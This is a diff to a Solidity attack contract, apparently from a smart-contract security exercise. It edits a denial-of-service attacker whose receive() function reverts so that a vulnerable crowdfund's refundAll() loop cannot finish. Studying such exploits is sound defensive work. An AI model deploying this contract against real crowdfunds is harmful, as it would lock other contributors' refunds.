@@ -18,8 +18,8 @@ contract Attack2DoSAttacker {
     event JoinedCrowdfund(address indexed attacker, uint256 amount);
     event RefundAllBlocked(address indexed attacker);
 
-    constructor(address _vulnerable) {
-        attacker = payable(msg.sender);
+    constructor(address _vulnerable, address _attacker) {
+        attacker = payable(_attacker);
         vulnerable = ICrowdfundBulkRefund(_vulnerable);
     }
 
@@ -37,7 +37,7 @@ contract Attack2DoSAttacker {
     }
 
     // STEP 2: Call refundAll() – the receive() below will revert to block the loop.
-    function blockRefunds() external onlyAttacker {
+    function triggerRefundAll() external onlyAttacker {
         vulnerable.refundAll();
         emit RefundAllBlocked(attacker);
     }
@@ -55,6 +55,6 @@ contract Attack2DoSAttacker {
 
     // Revert on incoming refunds to block the vulnerable loop
     receive() external payable {
-        revert("DoS attacker refuses refund");
+        revert("DoS attacker blocking refund");
     }
 }
